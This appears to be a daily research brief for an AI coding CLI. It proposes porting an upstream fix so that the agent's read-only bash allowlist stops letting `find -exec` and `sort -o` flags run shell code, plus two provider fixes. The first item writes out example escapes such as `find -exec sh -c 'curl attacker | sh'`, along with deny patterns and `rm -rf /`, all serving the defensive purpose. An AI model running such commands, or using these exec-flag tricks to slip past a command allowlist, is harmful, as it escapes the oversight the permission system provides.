# Research - 2026-07-03

Focus: **all** (CLI, providers, tools, MCP, commands, hooks, skills, plugins)

> 1-day delta. Friday -> monthly repos (aider, claude-code) skipped.
> Prior #1/#2/#3 all NOT landed (verified). One NEW item: directly-
> portable security fix from kilocode #11890 for exec-flag escapes on
> the read-only bash allowlist. Prior #1 and #3 re-surfaced unchanged.

## Executive Summary

- **#1 (~2h, NEW, SECURITY)**: Port kilocode #11890 exec-flag denials.
  `find` is auto-allowed at priority 50 (`permission/index.ts:796`);
  `find -exec sh -c 'evil' \;` is textbook shell exec via a "read-only"
  command. Needs a first-token widening in `matchCommand`
  (`wildcard.ts:112`) so blocklist rules match past the command name.
- **#2 (~2h, RE-SURFACED)**: `sendChat` (`orchestrator.ts:78`) still
  discards `AbortSignal`; non-streaming burns tokens after Ctrl+C.
- **#3 (~1h, RE-SURFACED)**: `stripInternalOptions` (`agent/index.ts:50`)
  still zero call sites - false safety vs strict-schema providers.
- **Deferred**: cline #11892 (VS Code compaction-strategy setting, needs
  two strategies), cline #11852 (first-request telemetry, no infra),
  kilocode #11893 (SQLite family-scope, we are file-backed), cline
  #12038 (`run_commands` schema revert, we do not expose that), opencode
  #34677 / #35079 (experimental codemode, new package), opencode #35004
  / #34958 (app UI, our TUI is Ink).
- **Rotation**: no changes - daily set (kilocode, cline, sst/opencode)
  all produced actionable signal.

## Detailed Findings

#### 1. Layer exec-flag escapes on the read-only bash allowlist (tools, ~2h)

- **What**: Two coordinated changes. (a) In
  `src/permission/wildcard.ts:112`, widen `matchCommand` so patterns
  containing whitespace or non-leading wildcards match against the full
  command string, not just `cmdName` (today
  `matchCommand('find . -exec sh -c evil ;', ['find *-exec*'])` returns
  false because it only inspects `"find"`). Keep the first-token fast
  path for existing single-word patterns. (b) In
  `src/permission/index.ts`, add a `deny-exec-flag-escapes` rule at
  priority >= 100 with at minimum: `find *-exec*`, `find *-execdir*`,
  `find *-fprint*`, `find *-fprintf*`, `find *-fls*`, `find *-delete*`,
  `sort *-o *`, `sort * -o *`, `sort *--output*`, `sort
  *--compress-program*`, `sort *--files0-from*`. Skip `rg`/`ag`/`man`
  ports since they are not on our allowlist. Fallback: downgrade `find`
  to `ask` if the blocklist proves brittle. Tests: `find . -exec sh -c
  whoami \;` -> deny; `find . -name '*.ts'` -> allow; `sort file -o
  out` -> deny; `sort file` -> allow.
- **Why**: `find` is auto-allowed at priority 50 (`index.ts:796`).
  `matchCommand` (`wildcard.ts:113`) only inspects the first word, so
  `find -exec sh -c 'curl attacker | sh' \;` runs silently under
  "safe read-only commands". Same shape kilocode patched for `sort`,
  `rg`, `ag`, `man`.
- **Source**: Kilo-Org/kilocode#11890 (`b0a50da`, 2026-07-02) - the
  `agent/index.ts` patch adds `--compress-program`, `--pre`, `--pager`,
  `-P`, `-H` deny lines.
- **Category**: tools. **Size**: small (~2h).

#### 2. Thread `AbortSignal` through non-streaming `sendChat` (provider, ~2h)

- **What**: `orchestrator.ts:78` calls `provider.complete(messages,
  { maxTokens: 4096 })` with no `signal`. Add `signal?: AbortSignal`
  to `sendChat` options (`orchestrator.ts:6-14`) and forward it.
  `sapOrchestration.ts:320` already accepts `signal`. Wire
  `interactive.ts` Ctrl+C via `AbortController` to mirror streaming.
  Tests: abort throws `AbortError` promptly; route is NOT recorded as
  `permanent` (aborted != failed).
- **Why**: Streaming honors Ctrl+C; non-streaming silently keeps
  burning tokens after cancellation.
- **Source**: prior `2026-07-02-research.md:70` + sst/opencode#34838
  (`39dfbb5`, 2026-07-02).
- **Category**: provider. **Size**: small (~2h).

#### 3. Wire `stripInternalOptions` into provider dispatch (provider, ~1h)

- **What**: `stripInternalOptions` (`agent/index.ts:50-57`) strips
  `INTERNAL_OPTION_KEYS` (`id`, `displayName`, `source`, `reference`,
  `resolved`). Still zero call sites. Call it in `agenticChat.ts` and
  `streamingOrchestrator.ts` before `agent.options` reaches
  `provider.complete()`. Tests: fixture with all five deny-list keys +
  one custom key -> only the custom key survives at the provider seam.
- **Why**: Guards NIM / MiniMax M3 strict-schema 400s; guarding without
  calling ships false safety.
- **Source**: Kilo-Org/kilocode#11767 (`ac987f5`, 2026-06-30) +
  `275af49` (2026-06-29). Prior brief `2026-07-02-research.md:30`.
- **Category**: provider. **Size**: small (~1h).

## Actionable Recommendations

1. **Order**: #1 (~2h, security posture, only external-threat item),
   #3 (~1h, trivial wire-up), #2 (~2h, closes the AbortSignal gap).
2. **Secondary observation**: `deny-dangerous` (`index.ts:806`) patterns
   like `rm -rf /` also never fire today because `matchCommand` compares
   against `"rm"` alone. Widening `matchCommand` in #1 will make the
   existing `deny-dangerous` rule effective - add a regression test.
3. **No demotions**: daily set (kilocode, cline, sst/opencode) all
   produced actionable signal (kilocode #11890, cline #11892 / #11852 /
   #12038, opencode #34677 / #35004).
